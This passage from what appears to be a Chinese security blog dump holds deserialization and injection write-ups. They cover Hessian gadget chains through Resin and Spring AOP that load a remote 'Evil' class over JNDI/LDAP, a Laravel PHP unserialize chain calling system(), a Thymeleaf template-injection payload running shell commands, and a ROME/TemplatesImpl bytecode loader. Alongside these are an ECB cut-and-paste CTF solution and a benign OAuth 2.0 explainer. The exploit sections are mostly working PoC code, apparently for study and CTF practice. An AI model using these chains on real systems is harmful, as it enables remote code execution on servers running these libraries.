qName.toString(); } public static void setFiled(String className, Object o, String filedName, Object value) throws Exception{ Class&lt;?&gt; cl = Class.forName(className); Field field = cl.getDeclaredField(filedName); field.setAccessible(true); field.set(o,value); }} 那么接下去就是如何触发toString的问题了，如果不依赖于ROME的话，我们可以想到之前HotSwappableTargetSource的XString那一段链子，XString的equals会调用到obj2.toString()，只要obj2为前面的qName就可以接上去。 那么自然而然的就会想到HashMap了： 满足p.hash == hash、p.key!=key和key != null就可以调用到key.equals(k)，根据前面的推理k得是qName，key是xString，这里的key是后面put进来的，k是原先就有的，所以qName应该先put进hashMap，xString后put进hashMap。 对于key不相等hash想等的问题，这里可以关注到XString的hashCode函数： 他返回的是m_obj.hashCode()，那么我们可以先获取qName的hash，通过哈希的逆算法来得到相应的String值，然后赋值给m_obj就可以了。 POC如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192package org.example;import com.caucho.hessian.io.*;import javax.naming.CannotProceedException;import javax.naming.Context;import javax.naming.Reference;import com.caucho.naming.QName;import com.sun.org.apache.xpath.internal.objects.XString;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Hashtable;public class ResinTest { public static void main(String[] args) throws Exception { String refAddr = &quot;http://127.0.0.1:8000/&quot;; String refClassName = &quot;Evil&quot;; Reference ref = new Reference(refClassName,refClassName,refAddr); CannotProceedException cannotProceedException = new CannotProceedException(); setFiled(&quot;javax.naming.NamingException&quot;,cannotProceedException,&quot;resolvedObj&quot;,ref); Hashtable hashtable = new Hashtable(); Class&lt;?&gt; cla = Class.forName(&quot;javax.naming.spi.ContinuationContext&quot;); Constructor&lt;?&gt; constructor = cla.getDeclaredConstructor(CannotProceedException.class, Hashtable.class); constructor.setAccessible(true); Context continuationContext = (Context) constructor.newInstance(cannotProceedException,hashtable); QName qName = new QName(continuationContext,&quot;foo&quot;,&quot;bar&quot;);// qName.toString(); int hash = qName.hashCode(); String string = unhash(hash); XString xString = new XString(string); HashMap hashMap = new HashMap(); hashMap.put(qName,&quot;1&quot;); hashMap.put(xString,&quot;2&quot;); serialize(hashMap); unserialize(&quot;ser.bin&quot;); } public static String unhash(int hash){ int target = hash; StringBuilder answer = new StringBuilder(); if ( target &lt; 0 ) { answer.append(&quot;\\\\u0915\\\\u0009\\\\u001e\\\\u000c\\\\u0002&quot;); if ( target == Integer.MIN_VALUE ) return answer.toString(); target = target &amp; Integer.MAX_VALUE; } unhash0(answer, target); return answer.toString(); } private static void unhash0 ( StringBuilder partial, int target ) { int div = target / 31; int rem = target % 31; if ( div &lt;= Character.MAX_VALUE ) { if ( div != 0 ) partial.append((char) div); partial.append((char) rem); } else { unhash0(partial, div); partial.append((char) rem); } } public static void setFiled(String className, Object o, String filedName, Object value) throws Exception{ Class&lt;?&gt; cl = Class.forName(className); Field field = cl.getDeclaredField(filedName); field.setAccessible(true); field.set(o,value); } public static void serialize(Object obj) throws IOException { FileOutputStream fileOutputStream = new FileOutputStream(&quot;ser.bin&quot;); HessianOutput hessianOutput = new HessianOutput(fileOutputStream); SerializerFactory serializerFactory = new SerializerFactory(); serializerFactory.setAllowNonSerializable(true); hessianOutput.setSerializerFactory(serializerFactory); hessianOutput.writeObject(obj); hessianOutput.close(); } public static Object unserialize(String filename) throws IOException{ FileInputStream fileInputStream = new FileInputStream(filename); HessianInput hessianInput = new HessianInput(fileInputStream); HashMap o = (HashMap) hessianInput.readObject(); return o; }} Srping AOP这一条链还是从equals开始，org.springframework.aop.support.AbstractPointcutAdvisor的equals会首先对other进行判断，不等于自身而且是PointcutAdvisor类型就会在后续逻辑中调用getAdvice()。 这里可以看到org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor的getAdvice()实现，advice为null则会调用this.beanFactory.getBean()： 紧接着看到org.springframework.jndi.support.SimpleJndiBeanFactory的getBean()实现，如果this.isSingleton(name)为false就会调用到this.lookup进行远程获取： 之后会调用org.springframework.jndi.JndiLocatorSupport的lookup： 进而调用org.springframework.jndi.JndiTemplate的lookup()： 最后lookup会根据name加载远程类： 构造测试链的话就是从后往前套： 1234567891011121314public static void main(String[] args) throws Exception{ String rmi = &quot;ldap://127.0.0.1:1099/Evil&quot;; SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory(); simpleJndiBeanFactory.addShareableResource(rmi); Class&lt;?&gt; cl = Class.forName(&quot;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&quot;); DefaultBeanFactoryPointcutAdvisor defaultBeanFactoryPointcutAdvisor = new DefaultBeanFactoryPointcutAdvisor(); defaultBeanFactoryPointcutAdvisor.setBeanFactory(simpleJndiBeanFactory); defaultBeanFactoryPointcutAdvisor.setAdviceBeanName(rmi); AsyncAnnotationAdvisor asyncAnnotationAdvisor = new AsyncAnnotationAdvisor(); defaultBeanFactoryPointcutAdvisor.equals(asyncAnnotationAdvisor); } 因为other对传入的类型有要求，所以这里就传了一个继承PointcutAdvisor的AsyncAnnotationAdvisor类。 因为调用的是defaultBeanFactoryPointcutAdvisor的equals，所以在HashMap中他应该在前面，POC如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package org.example;import com.caucho.hessian.io.HessianInput;import com.caucho.hessian.io.HessianOutput;import com.caucho.hessian.io.SerializerFactory;import org.springframework.aop.PointcutAdvisor;import org.springframework.aop.support.*;import org.springframework.jndi.support.SimpleJndiBeanFactory;import org.springframework.scheduling.annotation.AsyncAnnotationAdvisor;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.lang.reflect.Field;import java.util.HashMap;public class AOPTest { public static void main(String[] args) throws Exception{ String rmi = &quot;ldap://127.0.0.1:1099/Evil&quot;; SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory(); simpleJndiBeanFactory.addShareableResource(rmi); Class&lt;?&gt; cl = Class.forName(&quot;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&quot;); DefaultBeanFactoryPointcutAdvisor defaultBeanFactoryPointcutAdvisor = new DefaultBeanFactoryPointcutAdvisor(); defaultBeanFactoryPointcutAdvisor.setBeanFactory(simpleJndiBeanFactory); defaultBeanFactoryPointcutAdvisor.setAdviceBeanName(rmi); AsyncAnnotationAdvisor asyncAnnotationAdvisor = new AsyncAnnotationAdvisor(); defaultBeanFactoryPointcutAdvisor.equals(asyncAnnotationAdvisor); HashMap hashMap = new HashMap(); hashMap.put(defaultBeanFactoryPointcutAdvisor,&quot;1&quot;); hashMap.put(asyncAnnotationAdvisor,&quot;2&quot;); serialize(hashMap); unserialize(&quot;ser.bin&quot;); } private static void setValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException { Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj,value); } public static void setFiled(String className, Object o, String filedName, Object value) throws Exception{ Class&lt;?&gt; cl = Class.forName(className); Field field = cl.getDeclaredField(filedName); field.setAccessible(true); field.set(o,value); } public static void serialize(Object obj) throws IOException { FileOutputStream fileOutputStream = new FileOutputStream(&quot;ser.bin&quot;); HessianOutput hessianOutput = new HessianOutput(fileOutputStream); SerializerFactory serializerFactory = new SerializerFactory(); serializerFactory.setAllowNonSerializable(true); hessianOutput.setSerializerFactory(serializerFactory); hessianOutput.writeObject(obj); hessianOutput.close(); } public static Object unserialize(String filename) throws IOException{ FileInputStream fileInputStream = new FileInputStream(filename); HessianInput hessianInput = new HessianInput(fileInputStream); HashMap o = (HashMap) hessianInput.readObject(); return o; }}","link":"/2024/04/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"OAuth 2.0 一种第三方授权访问机制","text":"简单来说，OAuth就是一种授权机制，它能够为第三方应用提供访问用户资源的授权。 例如我们在玩某个游戏的时候需要获取QQ的好友列表，那么就需要遵循这个协议跟QQ服务器进行确认身份和协商，让游戏应用拿到允许获取QQ好友的一个令牌，然后游戏应用通过这个令牌就能够跟QQ服务器获取得到QQ好友列表。而这个令牌是有一个有效期的，过期就无法使用，这样就防止了令牌被滥用；当然这个令牌能获取到的数据也是有限的，他只能获取到你授权的内容，如果你只授权QQ好友的话，那么他是获取不到关于你QQ空间、QQ邮箱里面的内容的；而且当你不想玩这个游戏的时候还能够撤销这个令牌，让游戏无法再获取你的QQ好友列表。 也就是说通过OAuth授权第三方应用得到的令牌就是一个临时访问特定资源的凭证，值得注意的是只要拿到了令牌系统就不会再进行身份认证了，因此令牌必须保密，防止泄露导致数据被非法访问。目前一般的流程为先备案再授权，系统只会向有在本系统进行备案的应用颁发令牌，这样可以在一定程度上防止令牌被滥用。 一、授权方式基于不同的场景，OAuth 2.0 有四种授权方式，分别为： 授权码（authorization-code） 隐藏式（implicit） 客户端凭证（client credentials） 密码式（password） 假设网站b要向网站a获取访问用户C的数据的令牌，在网站a进行备案之后即可开始权限获取，下文将通过图示对四种授权方式进行描述： （一）授权码最常用也是安全性最高的方式，一般授权码由前端获取，而令牌由后端获取，这样前后分离使得令牌不易泄露。 （二）隐藏式适用于无后端的应用，安全性不高，只能用于对安全要求不高的场景，而且授权的令牌有效期一般较短。值得一提的是获取到令牌回调到原网站时，令牌存储位置采用的是锚点，由于oauth 2.0允许回调的网站是http的，因此存在中间人攻击的风险，但是采用锚点就有效减少了泄露的风险，毕竟浏览器跳转时锚点并不会发送到浏览器。 （三）客户端凭证适用于没有前端的命令行应用。 （四）密码式这种方式一般是在其他方式都无法采用的情况下才会采用的，用户必须高度信任该应用，毕竟需要将用户名和密码交出来，存在的风险非常大。 二、令牌的使用网站b拿到了网站a的令牌之后，就可以向网站a提供的API发起请求获取数据了，令牌的位置一般是在数据包请求头，添加Authorization: xxxxxxxx键值对。当令牌过期时，OAuth 2.0允许用户自动更新令牌，注意到前面获取到的 JSON 数据中含有refresh_token字段，这就是用于获取新令牌的字段，用户在令牌过期前用refresh_token向网站a发送请求更新令牌即可，一般格式为https://b.com/oauth/token?grant_type=refresh_token&amp;client_id=CLIENT_ID&amp;client_secret=CLIENT_SECRET&amp;refresh_token=REFRESH_TOKEN。 【参考】https://www.ruanyifeng.com/blog/2019/04/oauth-grant-types.html https://datatracker.ietf.org/doc/html/rfc6749 https://oauth.net/2/","link":"/2022/05/07/OAuth-2-0-%E4%B8%80%E7%A7%8D%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/"},{"title":"MRCTF 2022 复现（一）一道非常有意思的misc (pdd)","text":"这是一道web+crypto题，第一次让我切实体会到ECB加密模式所存在一大缺陷，就是难以抵抗统计攻击，相同明文所对应的密文是一样的，在知道一些明文-密文片段的情况下，可以通过拼接得到我们想要的密文。 简单来说EBC模式下图所示，明文先被分成固定长度的分组，随后每一组进行相同的加密操作得到对应的密文分组，再将其拼接起来即可。 话不多说直接看题目，打开是一个抽奖页面，正常情况下有十次机会，当进度达到100/100的时候即可得到flag。 通过更改X-Forwarded-For修改ip发现剩余抽奖次数刷新，也就是说可以通过无限次抽奖，于是编写代码进行自动抽奖，把进度抽到100那不就可以得到flag了吗？但是pdd终究还是不能信的，抽了白天从99.0抽到了0.99999999999991然后就直接跳到了0.9999987，想要通无限抽奖来使进度达到100是不可能的。 只能寻找别的办法，先来看一下源码，看看具体是干了什么事情： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768help(t) { this.$axios.get(`/lucky.php?action=help&amp;udb=${t}`).then((t =&gt; { console.log(t.data); let e = t.data; 200 === t.data.code ? this.$vToastify.success(e.detail) : this.$vToastify.error(e.detail) }))},randomString(t) { t = t || 32; let e = &quot;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678&quot;, n = e.length, r = &quot;&quot;; for (let o = 0; o &lt; t; o++) r += e.charAt(Math.floor(Math.random() * n)); return r},start() { let t = &quot;user_&quot; + this.randomString(6); this.$axios.post(&quot;/lucky.php?action=start&quot;, { username: t }).then((t =&gt; { console.log(t.data); let e = t.data; if (200 === t.data.code) { let n = t.data.enc; this.setEnc(n), this.user = { username: e.username, times: e.times, money: e.money }, this.sharelink = `/?udb=${e.userdb}`, this.remain = 100 - this.user.money, alert(`运气王！恭喜你还差${this.remain}就能免费拿flag`) } else this.$vToastify.error(e.detail) }))},getUserInfo() { this.$axios.post(&quot;/lucky.php?action=info&quot;, { enc: this.getEnc() }).then((t =&gt; { let e = t.data; if (200 == t.data.code) { let n = t.data.enc; this.setEnc(n), this.user = { username: e.username, times: e.times, money: e.money }, this.remain = 100 - this.user.money, this.sharelink = `/?&amp;udb=${e.userdb}`, 100 === e.money &amp;&amp; this.getflag() } else this.$vToastify.error(e.detail), this.logout() }))},logout() { sessionStorage.clear(), localStorage.clear() },setEnc(t) { sessionStorage.setItem(&quot;enc&quot;, t), localStorage.setItem(&quot;enc&quot;, t) },getEnc() { return localStorage.getItem(&quot;enc&quot;) },getFlag() { this.$axios.post(&quot;/lucky.php?action=getFlag&quot;, { enc: this.getEnc() }).then((t =&gt; { let e = t.data; 200 === t.data.code ? this.$vToastify.success(e.flag) : this.$vToastify.error(e.detail) }))},startCallback() { this.$refs.myLucky.play(), this.$axios.post(&quot;/lucky.php?action=lucky&quot;, { enc: this.getEnc() }).then((t =&gt; { let e = t.data; if (200 == t.data.code) { let n = t.data.enc; this.setEnc(n), this.remain -= e.bonus, this.index = e.arg } else this.index = -1, this.$vToastify.error(e.detail); this.$refs.myLucky.stop(this.index) }))},endCallback() { this.getUserInfo(), -1 != this.index &amp;&amp; alert(`太棒了${this.prizes[this.index].fonts[0].text}一刀！还剩${this.remain}就能免费拿flag了`) }},mounted() { this.getQueryVariable(&quot;udb&quot;) &amp;&amp; this.help(this.getQueryVariable(&quot;udb&quot;)); let t = localStorage.getItem(&quot;enc&quot;); t ? this.getUserInfo() : this.start() }}, 它的运行逻辑为打开网页开始抽奖前会先判断当前是否已经登录，如果没有登录就会随机生成一个用户名进行注册，随后才可以进行抽奖。每次抽奖都会发送enc给服务器，服务器运行抽奖后就会生成新的enc，同时也会返回进度money、次数time、奖励bonus、和序列化信息debug等，如果进度达到100就会获取flag。那么我们就能够从这段代码中提取出与服务器进行交互的数据接口： url 参数 返回值 /lucky.php?action=help&amp;udb= udb=用户数据库信息 用户查询结果 /lucky.php?action=start username code,enc,username,times,money,remain,userdb,debug /lucky.php?action=info enc code,enc,username,money,times,userdb /lucky.php?action=getFlag enc code,flag/detail /lucky.php?action=lucky enc code,arg,remain,bonus,money,debug 每次抽奖都会交互一个键名为enc键值为base64字符串的键值对，同时还有一个键名为debug键值一串序列化字符串的键值对，而且enc的值和debug的值的变化都是局部变化，而且变化的位置是相对应的，猜想enc的值是对debug的值的加密，而且加密模式很有可能是ECB模式。因为用户名username是可控的，所以可以来验证一下这个猜想，发送几个固定长度的username后观察enc的变化： 1234567891011121314151617debug序列化字符串依次为：（长度73）O:4:&quot;User&quot;:3:{s:8:&quot;username&quot;;s:3:&quot;123&quot;;s:5:&quot;times&quot;;i:0;s:5:&quot;money&quot;;i:50;}O:4:&quot;User&quot;:3:{s:8:&quot;username&quot;;s:3:&quot;120&quot;;s:5:&quot;times&quot;;i:0;s:5:&quot;money&quot;;i:62;}O:4:&quot;User&quot;:3:{s:8:&quot;username&quot;;s:3:&quot;110&quot;;s:5:&quot;times&quot;;i:0;s:5:&quot;money&quot;;i:57;}相对应的enc依次为：SRMr2xR0uuLsQScgoAegYwrQrdxDA2bfJG2zu/f8n1+A+TMB5YDee3ol2o8qhvX96lZQYpXeLEVisXnuj463nKa6JLxkUp8N6AbFMBuadHI=SRMr2xR0uuLsQScgoAegYwrQrdxDA2bfJG2zu/f8n1+ytSKLMwHB+38uW0MmS4oA6lZQYpXeLEVisXnuj463nIf5+8R4W7nifRCmLvINSgw=SRMr2xR0uuLsQScgoAegYwrQrdxDA2bfJG2zu/f8n1/0lOjp3Dr/NylSajbI9u+p6lZQYpXeLEVisXnuj463nLZp2pD6RKVo7oQHJxSovWA=把enc转为16进制数并按32一组分隔开：（长度为160）49132bdb1474bae2ec412720a007a063 0ad0addc430366df246db3bbf7fc9f5f 80f93301e580de7b7a25da8f2a86f5fd ea56506295de2c4562b179ee8f8eb79c a6ba24bc64529f0de806c5301b9a7472 49132bdb1474bae2ec412720a007a063 0ad0addc430366df246db3bbf7fc9f5f b2b5228b3301c1fb7f2e5b43264b8a00 ea56506295de2c4562b179ee8f8eb79c 87f9fbc4785bb9e27d10a62ef20d4a0c 49132bdb1474bae2ec412720a007a063 0ad0addc430366df246db3bbf7fc9f5f f494e8e9dc3aff3729526a36c8f6efa9 ea56506295de2c4562b179ee8f8eb79c b669da90fa44a568ee84072714a8bd60 观察到debug字符串的长度刚好接近enc的十六进制数表示的二分之一，而1个字符占8比特，一个十六进制数能够表示4比特，两个十六进制数就可以表示一个字符。那么160个十六进制数能够表示80个字符，也就是说debug的序列化字符串会被填充到80个，80=16*5，这里猜测分组加密是16个字符（32个十六进制数）一组进行加密的，如果序列化字符串不够16的整数倍的话，则会被填充，至于填充的内容是什么呢那就不得而知了。观察这三个enc的十六进制发现只有第3、5组是不一样的，结合这三个enc所表示的username和money不一样，猜测这两个部分应该就是用户名和当前进度所在的位置，至于分别对应那一个我们可以通过拼接enc然后给向服务器查询来获知。 将第一个enc的第三部分替换成第二个enc的第三部分，然后提交到/lucky.php?action=info进行查询就可获得拼接成的enc所表示的信息，通过返回的debug可以发现第三部分表示的是有关用户名的信息，那第五部分就是表示当前进度的块了。如下所示将debug和enc分别按16和32分组对齐： 可以观察到其实就是直接把debug序列化字符串拿去分组加密了，这样的话，我们可以通过控制发送给/lucky.php?action=start的username来获取到任意块的密文也就是所其实我们是得到了一个加密机。那么接下来就是利用加密机来构造出表示进度为100的密文块，从而拼接得到进度为100的用户enc，从而获取flag。 在返回得debug序列化字符串中，包含的内容分别为用户名username，抽奖次数times，当前进度money，我们需要将money的值替换为100，但是其所在位置并不是完整的一个分组所以会被填充字符，在不知道填充字符是什么的情况下我们并不能够伪造得到相应的密文，比赛的时候也是踩了这个坑，去试了好几个填充都不对。等到后来看大佬的做法才发现，原来可以把money的位置前移，使其不会在最后那么也就不必考虑填充的问题。 如下图所示，控制username长度使得分组便于我们进行操作，把原始序列化对象的money属性前移，随后补上其值，最后再将属性补全，因为times是供客户端判断，修改掉并不会产生影响，这样也就构造出了进度为100的用户序列化对象，接下来就是获取相对于的密文了。 前文提到我们只需要控制username就能够得到对应块的密文，所以我们构造内容为0000000000000&quot;;s:5:&quot;money&quot;;i:100;s:3:&quot;tim&quot;;i:的用户名，这样就可以得到上图两个修改后的蓝色块所对应的密文： 12345678910O:4:&quot;User&quot;:3:{s: 49132bdb1474bae2ec412720a007a0638:&quot;username&quot;;s:4 15f621f17ab386f772f62c463899dedd5:&quot;0000000000000 506ffa9bb6c9e6203423f7dff0acb353&quot;;s:5:&quot;money&quot;;i: 1d56d601aaa47d48b75190a7495101c2100;s:3:&quot;tim&quot;;i: db9942cb8f914708c6c3265bd825b812&quot;;s:5:&quot;times&quot;;i: ab18b48b4d2709573c5f69fdd22e053c0;s:5:&quot;money&quot;;i: a06e52b7688f7cf039c751ff8b5c30c563;} fe58b84deeb172bbc47e811c80434ac4 再将其替换掉原有的密文相应的部分： 123456O:4:&quot;User&quot;:3:{s: 49132bdb1474bae2ec412720a007a0638:&quot;username&quot;;s:1 0973f6da1decade02d33d372a38697263:&quot;1230000000000 b01de36b0bca82112784705763ee8073&quot;;s:5:&quot;times&quot;;i: ab18b48b4d2709573c5f69fdd22e053c ==&gt; &quot;;s:5:&quot;money&quot;;i: 1d56d601aaa47d48b75190a7495101c20;s:5:&quot;money&quot;;i: a06e52b7688f7cf039c751ff8b5c30c5 ==&gt; 100;s:3:&quot;tim&quot;;i: db9942cb8f914708c6c3265bd825b81268;} ee6c3c234980cf4a510ee40f34ca4a14 即可得到我们想要的密文： 123456O:4:&quot;User&quot;:3:{s: 49132bdb1474bae2ec412720a007a0638:&quot;username&quot;;s:1 0973f6da1decade02d33d372a38697263:&quot;1230000000000 b01de36b0bca82112784705763ee8073&quot;;s:5:&quot;money&quot;;i: 1d56d601aaa47d48b75190a7495101c2100;s:3:&quot;tim&quot;;i: db9942cb8f914708c6c3265bd825b81268;} ee6c3c234980cf4a510ee40f34ca4a14 将十六进制表示转为base64： 1enc=SRMr2xR0uuLsQScgoAegYwlz9tod7K3gLTPTcqOGlyawHeNrC8qCESeEcFdj7oBzHVbWAaqkfUi3UZCnSVEBwtuZQsuPkUcIxsMmW9gluBLubDwjSYDPSlEO5A80ykoU 发送给/lucky.php?action=getFlag即可得到flag： 1{&quot;code&quot;:&quot;200&quot;,&quot;flag&quot;:&quot;MRCTF{Xi_Xi0ngDi_9_Na_Kan_w0!}&quot;}","link":"/2022/04/30/MRCTF-2022-%E5%A4%8D%E7%8E%B0%EF%BC%88%E4%B8%80%EF%BC%89%E4%B8%80%E9%81%93%E9%9D%9E%E5%B8%B8%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84misc-pdd/"},{"title":"NepCTF-2022-WP","text":"因为有其它的事情，只上线了一会，解了两个签到题就跑路了。 WebJust Kidding参考：https://xz.aliyun.com/t/11362 第一条链子。 对照几处关键点都相符： \\vendor\\laravel\\framework\\src\\Illuminate\\Broadcasting\\PendingBroadcast.php \\vendor\\laravel\\framework\\src\\Illuminate\\Bus\\Dispatcher.php 可直接利用，poc如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpnamespace Illuminate\\Contracts\\Queue{ interface ShouldQueue {}}namespace Illuminate\\Bus{ class Dispatcher{ protected $container; protected $pipeline; protected $pipes = []; protected $handlers = []; protected $queueResolver; function __construct() { $this-&gt;queueResolver = &quot;system&quot;; } }}namespace Illuminate\\Broadcasting{ use Illuminate\\Contracts\\Queue\\ShouldQueue; class BroadcastEvent implements ShouldQueue { function __construct() {} } class PendingBroadcast{ protected $events; protected $event; function __construct() { $this-&gt;event = new BroadcastEvent(); $this-&gt;event-&gt;connection = &quot;cat /flag&quot;; $this-&gt;events = new \\Illuminate\\Bus\\Dispatcher(); } }}namespace { $pop = new \\Illuminate\\Broadcasting\\PendingBroadcast(); echo base64_encode(serialize($pop));} 1Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czo0OiJscyAvIjt9fQ== 1Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czo5OiJjYXQgL2ZsYWciO319 flag: NepCTF{c2edd745-b451-4b64-a37e-bdd1942d5a7c} Challengerjava Thymeleaf 模板注入，直接打就行 payload如下： 1/eval?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20flag%22).getInputStream()).next()%7d__::.x flag: NepCTF{c2edd745-b451-4b64-a37e-bdd1942d5a7c} 一些相关的学习链接 Java安全之Thymeleaf 模板注入分析 https://www.cnblogs.com/nice0e3/p/16212784.html","link":"/2022/07/20/NepCTF-2022-WP/"},{"title":"ROME反序列化","text":"前置知识：TemplatesImpl任意类加载、JNDI注入 简介ROME库支持将Java对象转换成xml数据，同时也支持将xml数据转换成Java对象。 环境依赖 12345&lt;dependency&gt; &lt;groupId&gt;rome&lt;/groupId&gt; &lt;artifactId&gt;rome&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt;&lt;/dependency&gt; ROME提供了toStringBean类，可以利用toString方法对Java Bean进行操作。而这里面的toString方法就是ROME反序列化漏洞调用链的关键之一。 任意类加载在toString当中能调用到任意的getter，而我们TemplatesImpl类的任意类加载正是利用了getOutputProperties()这一getter。 BeanIntrospector.getPropertyDescriptors之后会在下面循环调用获取到的getter方法进行反射调用，所以如果ToStringBean的_beanClass是Templates的话，那么在获取getter的时候就可以获取到getOutputProperties方法来反射调用，从而触发TemplatesImpl类的任意类加载。 所以现在问题的关键就在于如何在反序列化的过程中调用ToStringBean.toString()，也就是说要找到一个可以从readObject到toString的路径。 可以做一个测试： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354ROMEtoStringTest.javapackage org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.ToStringBean;import javax.xml.transform.Templates;import java.nio.file.Files;import java.nio.file.Paths;import java.lang.reflect.Field;public class ROMEtoStringTest { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); byte[] bytes = Files.readAllBytes(Paths.get(&quot;savedir\\\\shell.class&quot;)); setValue(templates,&quot;_name&quot;,&quot;aaa&quot;); setValue(templates,&quot;_bytecodes&quot;,new byte[][]{bytes}); setValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,templates); toStringBean.toString(); } private static void setValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException { Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj,value); }}shell.javaimport com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class shell extends AbstractTranslet { @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public shell() throws IOException { try { Runtime.getRuntime().exec(&quot;calc&quot;); }catch (Exception e){ e.printStackTrace(); } }} EqualsBean在ROME中有一个EqualsBean类，他从在这样一条调用链：hashCode–&gt;beanHashCode–&gt;_obj.toString()，这里的_obj是EqualsBean的一个可控的成员变量。那么到这里我们就可以联想到HashMap在反序列化的时候就会调用到hashCode，这里也就可以接上去了。 POC如下： 需要注意的是在序列化之前为了防止提前触发任意类加载，toStringBean的_obj要在hashMap.put之后再通过反射进行赋值，因此这里new ToStringBean的时候会先把new ConstantTransformer(1)塞进去，需在再加一个依赖 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.1&lt;/version&gt; &lt;/dependency&gt;package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import org.apache.commons.collections4.functors.ConstantTransformer;import javax.xml.transform.Templates;import java.io.*;import java.nio.file.Files;import java.nio.file.Paths;import java.lang.reflect.Field;import java.util.HashMap;public class EqualsBeanTest { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); byte[] bytes = Files.readAllBytes(Paths.get(&quot;savedir\\\\shell.class&quot;)); setValue(templates,&quot;_name&quot;,&quot;aaa&quot;); setValue(templates,&quot;_bytecodes&quot;,new byte[][]{bytes}); setValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1)); EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean); HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(equalsBean,&quot;123&quot;); setValue(toStringBean,&quot;_obj&quot;,templates); serialize(hashMap); unserialize(&quot;ser1.bin&quot;); } private static void setValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException { Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj,value); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser1.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; }} ObjectBean这个类在他的hashCode()里面调用了_equalsBean.beanHashCode()，那么他其实就相当于EqualsBean的hashCode： ​ 